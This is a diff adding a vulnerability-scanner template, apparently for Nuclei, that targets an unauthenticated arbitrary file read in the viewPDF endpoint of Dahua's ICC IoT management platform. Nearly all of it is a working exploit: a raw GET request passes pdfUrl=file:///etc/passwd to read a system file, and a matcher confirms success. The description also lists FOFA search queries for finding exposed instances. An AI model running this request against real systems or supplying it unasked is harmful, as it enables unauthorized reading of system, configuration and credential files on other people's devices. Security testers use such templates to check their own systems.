@@ -1,0 +1,24 @@
+id: dahua-icc-viewpdf-file-read
+
+info:
+  name: 大华ICC智能物联综合管理平台 viewPDF 组件文件读取漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="location.hash.indexOf('/authLogin')" || body="客户端会小于800" || title="智能物联综合管理平台" || body="* 客户端会小于800*" || body="/static/fontshd/font-hd.css"
+          大华ICC智能物联综合管理平台 viewPDF 组件因路径校验机制缺失，导致攻击者可通过构造恶意请求读取任意文件内容。该缺陷允许未经授权的远程攻击者获取系统配置文件、敏感数据等非公开资源。
+  tags: 大华ICC智能物联综合管理平台
+
+http:
+- raw:
+  - |
+    GET /evo-apigw/evo-cirs/material/viewPDF?filename=x.pdf&pdfUrl=file:///etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
